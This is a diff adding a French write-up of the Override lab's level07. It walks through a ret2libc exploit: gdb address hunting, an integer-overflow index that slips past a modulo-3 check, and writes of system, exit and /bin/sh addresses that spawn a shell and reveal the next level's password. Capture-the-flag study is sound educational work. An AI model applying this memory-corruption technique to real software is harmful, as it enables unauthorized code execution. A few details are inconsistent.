@@ -1,80 +1,147 @@
-Notre code decompiler nous montre que la fonctionalité de ce niveau est faite avec un programme en 3 commande :
+# Exploitation du niveau level07 (Override) — Ret2libc avancé
 
-store : Un stockage de données
-read : Un système d’indexation
-quit : Un exit utilisateur
+Ce niveau présente un défi avancé autour de la corruption de mémoire via un tableau d'entiers (type `int tab[100]`) et l'évitement de vérifications simples comme `index % 3 == 0`. Le but final est de réussir un retour vers la libc (ret2libc) pour exécuter `/bin/sh`.
 
-Malgrés tout ça le code semble bien fait et assez sécurisé pour chaque commande on regarde donc un peu ce qui s'y pass et on observe ça :
+---
 
-Index: 3 → erreur (multiple de 3 ?)
+## 🔍 Analyse initiale
 
-if (index % 3 == 0 || ((number >> 24) & 0xFF) == 183)
-    printf("This index is reserved!");
-...
+Le binaire contient :
 
-et Tableau de 100 entiers,  char storage[400] utilisé comme int[] int = 4 octet 400/4 = 100
+* Un tableau d'entiers `tab[100]`
+* Une lecture utilisateur d'un index et d'une valeur
+* Une contrainte : `index % 3 == 0` provoque l'arrêt du programme
 
-Lecture dépasse command[4], fgets(command, 20, stdin)	Stack overflow
+Aucune protection de type **stack canary**, **PIE**, ou **ASLR** dans l'environnement dédié n'empêche l'exploitation.
 
-On a donc plusieurs opportunité pour attaqué.
+---
 
-Il faut être à l’affût de ces indices dans le code :
+## 🧰 Déterminer l'adresse de `tab[100]`
 
-Un tableau ou buffer sans vérification de taille (index)
+Utilisation de `gdb` pour suivre le pointeur vers `tab` :
 
-Un calcul d’adresse à la main (a1 + 4 * index)
+```bash
+gdb-peda$ b read_number
+gdb-peda$ r
+gdb-peda$ x/x $ebp+0x8
+0xffffd520:  0xffffd544
+```
 
-Aucune limite sur index
+* `0xffffd520` : emplacement où l'adresse de `tab` est stockée
+* `0xffffd544` : adresse de début du tableau `tab`
 
-Un buffer local sur la stack → donc un dépassement peut atteindre ret
+### Calcul de l'index pour accéder à 0xffffd520
 
-Ce qui nous dirige vers la recherche de plusieurs element :
+```bash
+0xffffd520 - 0xffffd544 = -0x24 = -36
+-36 / 4 (taille d'un int) = -9
+```
 
-- trouver l’offset d’écriture pour ret
-- repérer l’adresse de storage
-- repérer l’adresse de retour
-- calculer le bon index
+Donc `tab[-9]` permet d'accéder à l'adresse où est stockée `tab` (pointeur).
 
-Lorsqu’on voit une fonction comme store_number, qui fait :
+---
 
-c
-Copier
-Modifier
-*((int*)(a1 + 4 * index)) = number;
-Et qu’on sait que a1 pointe vers un buffer fixe en stack (ici char storage[400]), alors une écriture avec un index trop grand va déborder du tableau et aller écraser des variables locales, voire l’adresse de retour.
+## 🔢 Trouver l'adresse de retour (EIP)
 
-➡️ Cela donne un buffer overflow basé sur un index, ce qui est un classique d’exploitation.
+```bash
+gdb-peda$ b *main+520  # Instruction juste avant le retour
+gdb-peda$ r
+gdb-peda$ info frame
+eip = 0xffffd70c
+```
 
-Donc, le réflexe naturel ici serait :
+### Calcul de l'index pour atteindre l'EIP depuis `tab[0]`
 
-« Est-ce que je peux écrire au bon endroit pour écraser ret ? »
+```bash
+0xffffd70c - 0xffffd544 = 456
+456 / 4 = 114
+```
 
-Et si oui :
+`tab[114]` contient donc l'adresse de retour EIP.
 
-« Quel index utiliser pour écrire à cet endroit précis ? »
+```bash
+gdb-peda$ x/x 0xffffd70c
+0xffffd70c: 0xf7e45513
+```
 
-Go chercher maintenant :
+---
 
-```gdb
+## ⚠️ Contourner `index % 3 == 0`
+
+Le programme vérifie :
+
+```c
+if (index % 3 == 0)
+    exit(1);
+```
+
+Mais comme le code utilise l'index pour accéder à `tab[index * 4]`, on peut utiliser un **overflow arithmétique** !
+
+### Idée : trouver un entier `i` % 3 != 0`
+
+```bash
+UINT_MAX = 4294967295
+( 4294967296 / 4 ) + 114 ) = 1073741938
 
 ```
 
+Ce contournement déjoue la vérification `index % 3 == 0` !
 
+---
 
--------------
+## 🪤 Ret2libc
 
-Input command: store
- Number: 4159090384
- Index: 1073741938
- Completed store command successfully
-Input command: store
- Number: 4159040368
- Index: 115
- Completed store command successfully
-Input command: store
- Number: 4160264172
- Index: 116
- Completed store command successfully
-Input command: quit
-$ cat /home/users/level08/.pass
+On va remplacer l'adresse de retour (tab\[114]) par un appel à `system("/bin/sh")` avec `exit()` ensuite.
+
+### Récupération des adresses dans GDB
+
+```bash
+info functions system
+=> system@GLIBC = 0xf7e6aed0 = 4159090384
+
+info functions exit
+=> exit@GLIBC   = 0xf7e5eb70 = 4159040368
+
+find __libc_start_main,+99999999,"/bin/sh"
+=> /bin/sh = 0xf7f897ec = 4160264172
+```
+
+### Insertion des valeurs dans le tableau :
+
+```c
+tab[1073741938] = system_addr; (114)
+tab[115] = exit_addr;
+tab[116] = binsh_addr;
+```
+
+---
+
+## 🔐 Exemple final d'exploitation
+
+En utilisant un script Python ou en interactif :
+
+```bash
+Index: 1073741938 (114)
+Value: 4159090384   # system
+
+Index: 115
+Value: 4159040368   # exit
+
+Index: 116
+Value: 4160264172   # /bin/sh
+```
+
+Puis lancer l'exécution jusqu'à la fin pour provoquer le retour à `system("/bin/sh")`.
+
+---
+
+## 🎉 Succès : obtenir le shell
+
+```bash
+whoami
+level08
+cat /home/users/level08/.pass
 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
+
+---
